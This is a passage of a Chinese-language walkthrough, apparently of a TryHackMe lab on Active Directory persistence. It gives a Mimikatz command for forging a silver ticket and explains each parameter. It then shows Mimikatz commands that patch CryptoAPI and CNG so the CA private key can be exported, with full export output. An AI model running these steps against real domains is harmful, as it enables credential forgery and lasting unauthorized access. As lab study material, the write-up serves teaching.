<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165532727.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165532727.png" alt="image-20240226165532727"></p>
<p>接着我在原ssh上试了试发现成功</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165555756.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165555756.png" alt="image-20240226165555756"></p>
<p>即使黄金票据的有效期非常长，蓝队仍然可以通过简单地两次轮换 KRBTGT 密码来防御。如果我们真的想深入了解，我们希望生成白银票据，这些票据不太可能被发现，并且更难以防御，因为必须轮换每个机器帐户的密码。我们可以使用以下 Mimikatz 命令来生成白银票据：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:<span class="hljs-number">500</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> /target:THMSERVER1.za.tryhackme.loc /rc4:<span class="hljs-number">4</span>c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt<br></code></pre></td></tr></table></figure>
<p>参数解释：</p>
<ul>
<li>/admin - 我们要模拟的用户名。这不必是有效用户。</li>
<li>/domain - 我们要为其生成票证的域的 FQDN。</li>
<li>/id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。</li>
<li>/sid - 我们要为其生成票证的域的 SID。</li>
<li>/target - 我们的目标服务器的主机名。让我们做 THMSERVER1.za.tryhackme.loc，但它可以是任何加入域的主机。</li>
<li>/rc4 - 我们的目标计算机帐户的 NTLM 哈希值。查看 DC 同步结果以查找 THMSERVER1$ 的 NTLM 哈希值。 $ 表示它是一个机器帐户。</li>
<li>/service - 我们在 TGS 中请求的服务。 CIFS 是一个安全的选择，因为它允许文件访问。</li>
<li>/ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>我们可以通过对 THMSERVER1 运行 dir 命令来验证银票是否正常工作：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">dir \\thmserver1<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\c$\<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170201849.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170201849.png" alt="image-20240226170201849"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170443201.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170443201.png" alt="image-20240226170443201"></p>
<h1>0x04 通过证书进行持久化</h1>
<p><strong>这里有一个快速说明。从现在开始讨论的技术具有令人难以置信的侵入性并且难以消除。即使您已批准红队练习来执行这些技术，您在执行这些技术时也必须格外小心。在现实场景中，利用大多数这些技术将导致完整的域重建。确保您完全了解使用这些技术的后果，并且仅在您的评估事先获得批准并且认为有必要时才执行这些技术。在大多数情况下，红队演习此时将被取消，而不是使用这些技术。这意味着您很可能不会执行这些持久性技术，而是模拟它们。</strong></p>
<p>最后两种持久性技术依赖于凭据。虽然我们肯定可以让蓝队的生活变得复杂，但他们最终可以轮换足够的凭据来将我们踢出去。因此，虽然这些技术在让蓝队忙碌的同时保持着它们的忙碌很好，但我们应该寻找使用不依赖凭据的持久性技术，这意味着这些凭据的轮换不会将我们踢出去。我们将首先看看的是证书。</p>
<h2 id="AD-CS回归"><a href="#AD-CS回归" class="headerlink" title="AD-CS回归"></a>AD CS回归</h2>
<p>在利用 AD 室中，我们利用证书成为域管理员。但是，证书也可用于持久性。我们所需要的只是一个可用于客户端身份验证的有效证书。这将允许我们使用证书来请求 TGT。这有什么美感？我们可以继续请求 TGT，无论他们在我们攻击的账户上进行了多少轮换。我们被踢出的唯一方法是他们撤销我们生成的证书或者证书过期。这意味着我们可能在接下来的大约 5 年里默认拥有持久访问权限。</p>
<p>如果您有兴趣了解有关请求证书并将其用于 Kerberos 身份验证的最新信息，请转到利用 AD 或 AD 证书模板室。然而，在这个房间里，我们并没有闲逛。我们正在追查证书颁发机构 (CA) 本身。</p>
<p>根据我们的访问权限，我们可以再进一步。我们可以简单地窃取根 CA 证书的私钥，以便在任何时候生成我们自己的证书。更糟糕的是，由于这些证书从未被 CA 颁发，因此蓝队无法撤销它们。对于蓝队来说，这将是更糟糕的情况，因为这意味着CA的轮换，这意味着蓝队必须撤销所有已经颁发的证书才能将我们踢出去。想象一下，你刚刚花了两天的时间执行了域接管，轮换了每个特权帐户的凭据，重置了所有的黄金和白银票据，只是为了意识到攻击者通过成为你的 CA 而持续存在。糟糕！</p>
<h2 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h2>
<p>CA的私钥存储在CA服务器本身上。如果私钥未通过基于硬件的保护方法（例如硬件安全模块 (HSM)）进行保护（对于仅将 Active Directory 证书服务 (AD CS) 用于内部目的的组织来说通常是这种情况），则它会受到机器数据保护 API (DPAPI)。这意味着我们可以使用 Mimikatz 和 SharpDPAPI 等工具来提取 CA 证书，从而从 CA 中提取私钥。 Mimikatz 是使用最简单的工具，但如果您想体验其他工具，请看看<a target="_blank" rel="noopener" href="https://pentestlab.blog/2021/11/15/golden-certificate/">这里</a>。使用任务 2 中的管理员凭据使用 SSH 对 THMDC.za.tryhackme.loc 进行身份验证，为您的用户创建一个唯一的目录，移至该目录并加载 Mimikatz：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172020599.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172020599.png" alt="image-20240226172020599"></p>
<p>我们先看看能否查看到DC上存储的证书：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # crypto::certificates /systemstore:local_machine <br> * System Store  : <span class="hljs-string">&#x27;local_machine&#x27;</span> (<span class="hljs-number">0</span>x00020000) <br> * Store         : <span class="hljs-string">&#x27;My&#x27;</span><br><br> <span class="hljs-number">0</span>.<br>    Subject  :<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">040000000000703</span>a4d78090a0ab10400000010 <br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)<br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM<br>    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39<br>        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        Provider       : Microsoft RSA SChannel Cryptographic Provider <br>        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)<br>        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)<br>        |Provider name : Microsoft RSA SChannel Cryptographic Provider<br>        |Key Container : te-DomainControllerAuthentication-<span class="hljs-number">5</span>ed52c94-<span class="hljs-number">34</span>e8-<span class="hljs-number">4450</span>-a751-a57ac55a110f<br>        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 <br>        |Implementation: CRYPT_IMPL_SOFTWARE ;<br>        Algorithm      : CALG_RSA_KEYX<br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )<br>        Exportable key : NO<br><br> <span class="hljs-number">1</span>. za-THMDC-CA<br>    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA <br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">90</span>e157dae304ef429824a33d3a3ef91e<br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)<br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2027</span> <span class="hljs-number">7</span>:<span class="hljs-number">08</span>:<span class="hljs-number">09</span> PM<br>    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e <br>        Key Container  : za-THMDC-CA<br>        Provider       : Microsoft Software Key Storage Provider<br>        Provider type  : cng (<span class="hljs-number">0</span>)<br>        Type           : CNG Key (<span class="hljs-number">0</span>xffffffff)<br>        |Provider name : Microsoft Software Key Storage Provider<br>        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;  <br>        Key Container  : za-THMDC-CA<br>        Unique name    : <span class="hljs-number">8</span>d666f3049de45dee20c70510f66d2cf_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        Algorithm      : RSA<br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Export policy  : <span class="hljs-number">00000003</span> ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) <br>        Exportable key : YES<br>        LSA isolation  : NO<br><br> <span class="hljs-number">2</span>. THMDC.za.tryhackme.loc<br>    Subject  : CN=THMDC.za.tryhackme.loc<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">03000000000057</span>c6f9be06e7c78d0300000010<br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)<br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM <br>    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42<br>        Key Container  : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        Provider       : Microsoft RSA SChannel Cryptographic Provider<br>        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)<br>        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001) <br>        |Provider name : Microsoft RSA SChannel Cryptographic Provider<br>        |Key Container : te-DomainController-ccb1e691-<span class="hljs-number">6606</span>-<span class="hljs-number">40</span>a3-a87a-f549bdcd757c<br>        |Unique name   : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        |Implementation: CRYPT_IMPL_SOFTWARE ;<br>        Algorithm      : CALG_RSA_KEYX <br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )<br>        Exportable key : NO<br><br> <span class="hljs-number">3</span>.<br>    Subject  :<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">02000000000078856466521</span>a82570200000010<br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA) <br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM<br>    Hash SHA1: <span class="hljs-number">0</span>d43237c50ccb446a07572545b5b4c8cf517682a<br>        Key Container  : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        Provider       : Microsoft RSA SChannel Cryptographic Provider<br>        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>) <br>        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)<br>        |Provider name : Microsoft RSA SChannel Cryptographic Provider<br>        |Key Container : te-KerberosAuthentication-<span class="hljs-number">21</span>e4d1ee-<span class="hljs-number">54</span>f7-<span class="hljs-number">4</span>ca5-b36b-b2cecff9a609<br>        |Unique name   : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        |Implementation: CRYPT_IMPL_SOFTWARE ;  <br>        Algorithm      : CALG_RSA_KEYX<br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )<br>        Exportable key : NO<br></code></pre></td></tr></table></figure>
<p>我们可以看到DC上有CA证书。我们还可以注意到，其中一些证书被设置为不允许我们导出密钥。如果没有这个私钥，我们将无法生成新的证书。幸运的是，Mimikatz 允许我们修补内存以使这些密钥可导出：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>mimikatz # privilege::debug<br>Privilege <span class="hljs-string">&#x27;20&#x27;</span> OK<br><br>mimikatz # crypto::capi<br>Local CryptoAPI RSA CSP patched<br>Local CryptoAPI DSS CSP patched<br><br>mimikatz # crypto::cng<br><span class="hljs-string">&quot;KeyIso&quot;</span> service patched<br></code></pre></td></tr></table></figure>
<p>如果您收到错误，请不要担心，这只是意味着其他人在您之前执行了该补丁。修补这些服务后，我们可以使用 Mimikatz 导出证书：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # crypto::certificates /systemstore:local_machine /export <br> * System Store  : <span class="hljs-string">&#x27;local_machine&#x27;</span> (<span class="hljs-number">0</span>x00020000) <br> * Store         : <span class="hljs-string">&#x27;My&#x27;</span><br><br> <span class="hljs-number">0</span>.<br>    Subject  :<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">040000000000703</span>a4d78090a0ab10400000010 <br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)<br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM<br>    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39<br>        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 <br>        Provider       : Microsoft RSA SChannel Cryptographic Provider<br>        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)<br>        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)<br>        |Provider name : Microsoft RSA SChannel Cryptographic Provider<br>        |Key Container : te-DomainControllerAuthentication-<span class="hljs-number">5</span>ed52c94-<span class="hljs-number">34</span>e8-<span class="hljs-number">4450</span>-a751-a57ac55a110f <br>        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        |Implementation: CRYPT_IMPL_SOFTWARE ;<br>        Algorithm      : CALG_RSA_KEYX <br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )<br>        Exportable key : NO<br>        Public export  : OK - <span class="hljs-string">&#x27;local_machine_My_0_.der&#x27;</span> <br>        Private export : OK - <span class="hljs-string">&#x27;local_machine_My_0_.pfx&#x27;</span> <br><br> <span class="hljs-number">1</span>. za-THMDC-CA<br>    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">90</span>e157dae304ef429824a33d3a3ef91e <br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)<br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2027</span> <span class="hljs-number">7</span>:<span class="hljs-number">08</span>:<span class="hljs-number">09</span> PM<br>    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e <br>        Key Container  : za-THMDC-CA<br>        Provider       : Microsoft Software Key Storage Provider<br>        Provider type  : cng (<span class="hljs-number">0</span>)<br>        Type           : CNG Key (<span class="hljs-number">0</span>xffffffff) <br>        |Provider name : Microsoft Software Key Storage Provider<br>        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;<br>        Key Container  : za-THMDC-CA <br>        Unique name    : <span class="hljs-number">8</span>d666f3049de45dee20c70510f66d2cf_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        Algorithm      : RSA<br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Export policy  : <span class="hljs-number">00000003</span> ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) <br>        Exportable key : YES<br>        LSA isolation  : NO <br>        Public export  : OK - <span class="hljs-string">&#x27;local_machine_My_1_za-THMDC-CA.der&#x27;</span> <br>        Private export : OK - <span class="hljs-string">&#x27;local_machine_My_1_za-THMDC-CA.pfx&#x27;</span> <br><br> <span class="hljs-number">2</span>. THMDC.za.tryhackme.loc<br>    Subject  : CN=THMDC.za.tryhackme.loc<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">03000000000057</span>c6f9be06e7c78d0300000010<br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA) <br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM<br>    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42<br>        Key Container  : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        Provider       : Microsoft RSA SChannel Cryptographic Provider <br>        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)<br>        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)<br>        |Provider name : Microsoft RSA SChannel Cryptographic Provider<br>        |Key Container : te-DomainController-ccb1e691-<span class="hljs-number">6606</span>-<span class="hljs-number">40</span>a3-a87a-f549bdcd757c<br>        |Unique name   : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 <br>        |Implementation: CRYPT_IMPL_SOFTWARE ;<br>        Algorithm      : CALG_RSA_KEYX<br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) <br>        Exportable key : NO<br>        Public export  : OK - <span class="hljs-string">&#x27;local_machine_My_2_THMDC.za.tryhackme.loc.der&#x27;</span><br>        Private export : OK - <span class="hljs-string">&#x27;local_machine_My_2_THMDC.za.tryhackme.loc.pfx&#x27;</span> <br><br> <span class="hljs-number">3</span>.<br>    Subject  :<br>    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA<br>    Serial   : <span class="hljs-number">02000000000078856466521</span>a82570200000010 <br>    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)<br>    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM<br>    Hash SHA1: <span class="hljs-number">0</span>d43237c50ccb446a07572545b5b4c8cf517682a<br>        Key Container  : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 <br>        Provider       : Microsoft RSA SChannel Cryptographic Provider<br>        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)<br>        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)<br>        |Provider name : Microsoft RSA SChannel Cryptographic Provider<br>        |Key Container : te-KerberosAuthentication-<span class="hljs-number">21</span>e4d1ee-<span class="hljs-number">54</span>f7-<span class="hljs-number">4</span>ca5-b36b-b2cecff9a609 <br>        |Unique name   : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1<br>        |Implementation: CRYPT_IMPL_SOFTWARE ;<br>        Algorithm      : CALG_RSA_KEYX<br>        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)<br>        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) <br>        Exportable key : NO<br>        Public export  : OK - <span class="hljs-string">&#x27;local_machine_My_3_.der&#x27;</span><br>        Private export : OK - <span class="hljs-string">&#x27;local_machine_My_3_.pfx&#x27;</span><br></code></pre></td></tr></table></figure>
<p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172601555.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172601555.png" alt="image-20240226172601555"></p>
<p><code>za-THMDC-CA.pfx</code> 证书是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> 。使用 SCP 下载或复制此证书到您的 AttackBox，然后将其复制到 THMWRK1 上的低权限用户的主目录。如果您愿意，还可以在自己的未加入域的 Windows 计算机上执行其余步骤。</p>
<p>这里我不知为何我没有<code>za-THMDC-CA.pfx</code>证书，以下是文章示例</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226173047263.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226173047263.png" alt="image-20240226173047263"></p>
